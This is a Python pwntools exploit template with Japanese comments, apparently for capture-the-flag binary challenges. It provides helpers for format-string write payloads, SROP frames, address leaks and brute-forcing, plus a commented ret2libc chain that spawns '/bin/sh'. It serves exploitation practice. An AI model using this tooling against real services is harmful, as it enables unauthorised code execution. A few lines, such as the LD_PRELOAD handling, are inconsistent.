#!/usr/bin/env python3
# pwn template / pwntools >= 4.10
from __future__ import annotations

import os
import sys
import json
import time
import subprocess
import urllib.request

from pwn import *
from pwn import ELF, ROP, SigreturnFrame, context, remote, process

# ──────────────────────────────────────────────
# 0. 設定 (環境変数で上書きする)
# ──────────────────────────────────────────────
BIN   = os.environ.get("BIN",   "./chall")
LIBC  = os.environ.get("LIBC",  "")
LD    = os.environ.get("LD",    "")
HOST  = os.environ.get("HOST",  "127.0.0.1")
PORT  = int(os.environ.get("PORT", "1337"))
LOCAL = os.environ.get("LOCAL", "1") == "1"
GDB   = os.environ.get("GDB",   "0") == "1"

context.log_level = os.environ.get("LOG", "info")
context.terminal  = ["tmux", "splitw", "-h"]
context.timeout   = 5

elf = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if LIBC else None


# ──────────────────────────────────────────────
# 1. 接続
# ──────────────────────────────────────────────
def start(argv: list[str] = [], **kw) -> tube:
    if LOCAL:
        env = {}
        if LD and LIBC:
            env = {"LD_PRELOAD": LIBC} if not LD else {"LD_PRELOAD": LD}
        p = process([BIN, *argv], env={**os.environ, **env}, **kw)
        if GDB:
            attach(p, "b *main\ncontinue")
        return p
    return remote(HOST, PORT)


def attach(p: process, script: str = "") -> None:
    """tmux 等で gdb を横に開く"""
    if not isinstance(p, process):
        return
    gdb.attach(p, gdbscript=f"""
        set pagination off
        set follow-fork-mode parent
        {script}
    """)
    pause()


def dbg(script: str = "") -> None:
    """起動直後に止めて調査したいとき"""
    p = process(BIN)
    attach(p, script or "b *main\ncontinue")
    p.interactive()


# ──────────────────────────────────────────────
# 2. I/O ヘルパ
# ──────────────────────────────────────────────
def sla(p, d, s, **kw): p.sendlineafter(d, s, **kw)
def sa(p, d, s, **kw):  p.sendafter(d, s, **kw)
def ru(p, d, **kw):     return p.recvuntil(d, **kw)
def rl(p, **kw):        return p.recvline(**kw)
def sl(p, s):           p.sendline(s)
def s(p, d):            p.send(d)


def leak(p, d, n: int = 6, base: int = 16) -> int:
    """区切り文字 d まで読んで、直前の n byte を数値化する"""
    ru(p, d)
    raw = p.recv(n)
    return int.from_bytes(raw.ljust(n, b"\x00"), "little")


def choose(p, idx: int, d: bytes = b"> ") -> None:
    sla(p, d, str(idx).encode())


# ──────────────────────────────────────────────
# 3. 保護機構の確認
# ──────────────────────────────────────────────
def report() -> None:
    log.info(f"arch={elf.arch} bits={elf.bits} os={elf.os}")
    log.info(f"PIE={elf.pie} NX={elf.nx} Canary={elf.canary} RELRO={elf.relro}")
    log.info(f"static={not elf.dynamic} stripped={elf.stripped}")
    log.info(f"got={len(elf.got)} plt={len(elf.plt)} symbols={len(elf.symbols)}")
    if libc:
        log.info(f"libc={libc.path} system={hex(libc.symbols.get('system', 0))}")


def seccomp_dump() -> None:
    try:
        out = subprocess.run(["seccomp-tools", "dump", BIN],
                             capture_output=True, text=True, timeout=20)
        print(out.stdout or out.stderr)
    except FileNotFoundError:
        log.warn("seccomp-tools が無い")


# ──────────────────────────────────────────────
# 4. gadget / libc 解決
# ──────────────────────────────────────────────
def rop() -> ROP:
    r = ROP(elf)
    if elf.pie:
        log.warn("PIE: base leak 後に r.address を足すこと")
    return r


def one_gadget(path: str | None = None) -> list[int]:
    try:
        out = subprocess.check_output(["one_gadget", "--raw", path or LIBC],
                                      text=True)
        return [int(x, 16) for x in out.split()]
    except (FileNotFoundError, subprocess.CalledProcessError):
        return []


def libc_rip(symbols: dict[str, int]) -> ELF:
    """libc.rip から buildid 一致の libc を取得する"""
    req = urllib.request.Request(
        "https://libc.rip/api/find",
        data=json.dumps({"symbols": symbols}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        cands = json.load(r)
    if not cands:
        raise RuntimeError("libc 候補なし")
    bid = cands[0]["buildid"]
    dst = f"./libc-{bid}.so"
    if not os.path.exists(dst):
        urllib.request.urlretrieve(f"https://libc.rip/download/{bid}", dst)
    log.success(f"libc: {dst}")
    return ELF(dst, checksec=False)


# ──────────────────────────────────────────────
# 5. SROP frame
# ──────────────────────────────────────────────
def srop_frame(sysno: int, args: list[int], rip: int,
               rsp: int, arch: str = "amd64") -> SigreturnFrame:
    context.arch = arch
    f = SigreturnFrame()
    f.rax, f.rip, f.rsp = sysno, rip, rsp
    for reg, val in zip(("rdi", "rsi", "rdx", "r10", "r8", "r9"), args):
        setattr(f, reg, val)
    return f


# ──────────────────────────────────────────────
# 6. Format String
# ──────────────────────────────────────────────
def find_fmt_offset(magic: bytes = b"ZZZZZZZZ", limit: int = 200) -> int:
    """magic が何番目の引数に出るかを探す"""
    p = start()
    payload = magic + b"".join(f".%{i}$p".encode() for i in range(1, limit))
    sl(p, payload)
    ru(p, magic)
    out = rl(p).split(b".")
    want = hex(u64(magic))
    for i, tok in enumerate(out, start=1):
        if tok.decode(errors="ignore").strip() == want:
            p.close()
            return i
    p.close()
    raise RuntimeError("offset 不明")


def fmt_payload(offset: int, writes: list[tuple[int, int]],
                ptr_size: int = 8, iters: int = 6) -> bytes:
    """writes = [(addr, value)]。addr は昇順に整列される"""
    pk = p64 if ptr_size == 8 else p32
    ws = sorted((v & 0xFF, a) for a, v in writes)

    base = 0
    fmt = b""
    for _ in range(iters):
        fmt, cur = b"", base
        for i, (v, a) in enumerate(ws):
            pad = (v - cur) % 256
            if pad:
                fmt += f"%{pad}c".encode()
            fmt += f"%{offset + base // ptr_size + i}$hhn".encode()
            cur = v
        new_base = (len(fmt) + ptr_size - 1) // ptr_size * ptr_size
        if new_base == base:
            break
        base = new_base
    return fmt + b"\x00"[:0] + b"A" * (base - len(fmt)) + b"".join(pk(a) for _, a in ws)


def fmt_leak(offset: int, addr: int, ptr_size: int = 8) -> bytes:
    """addr の内容を %s で読む (終端は各自で)"""
    pk = p64 if ptr_size == 8 else p32
    idx = offset + 1
    head = f"%{idx}$s".encode()
    pad = (-len(head)) % ptr_size
    return head + b"B" * pad + pk(addr)


# ──────────────────────────────────────────────
# 7. 総当り (fork server 前提)
# ──────────────────────────────────────────────
def brute(fn, tries: int = 4096, delay: float = 0.0):
    for i in range(1, tries + 1):
        try:
            r = fn()
            if r:
                log.success(f"{i} 回目で成功")
                return r
        except (EOFError, PwnlibException):
            pass
        if delay:
            time.sleep(delay)
        if i % 256 == 0:
            log.info(f"{i} 回試行")
    raise RuntimeError("総当り失敗")


# ──────────────────────────────────────────────
# 8. ヒープ用ラッパ (問題のメニューに合わせて書き換え)
# ──────────────────────────────────────────────
def alloc(p, size: int, data: bytes = b"", d: bytes = b"> ") -> None:
    sla(p, d, b"1")
    sla(p, b"size", str(size).encode())
    if data:
        sa(p, b"data", data)


def edit(p, idx: int, data: bytes, d: bytes = b"> ") -> None:
    sla(p, d, b"2")
    sla(p, b"idx", str(idx).encode())
    sa(p, b"data", data)


def free(p, idx: int, d: bytes = b"> ") -> None:
    sla(p, d, b"3")
    sla(p, b"idx", str(idx).encode())


def show(p, idx: int, d: bytes = b"> ") -> bytes:
    sla(p, d, b"4")
    sla(p, b"idx", str(idx).encode())
    return rl(p)


# ──────────────────────────────────────────────
# 9. エクスプロイト本体
# ──────────────────────────────────────────────
def exploit(p) -> None:
    report()

    OFFSET = 0x48                      # TODO: 実測する

    # --- 例: PIE/NX/Full RELRO/Canary 無しの ret2plt リーク ---
    # payload  = b"A" * OFFSET
    # payload += p64(rop().find_gadget(["pop rdi", "ret"]).address)
    # payload += p64(elf.got["puts"])
    # payload += p64(elf.plt["puts"])
    # payload += p64(elf.symbols["main"])
    # sa(p, b"data: ", payload)
    #
    # leak_puts = u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))
    # libc.address = leak_puts - libc.symbols["puts"]
    # log.success(f"libc base = {hex(libc.address)}")
    #
    # --- 2 段目: ret2libc ---
    # payload  = b"A" * OFFSET
    # payload += p64(rop().find_gadget(["ret"]).address)   # 16 byte 整列
    # payload += p64(libc.symbols["system"])
    # payload += p64(0)
    # payload += p64(next(libc.search(b"/bin/sh")))
    # sa(p, b"data: ", payload)

    p.interactive()


def main() -> None:
    if len(sys.argv) > 1 and sys.argv[1] == "check":
        report()
        seccomp_dump()
        return
    p = start()
    exploit(p)


if __name__ == "__main__":
    main()
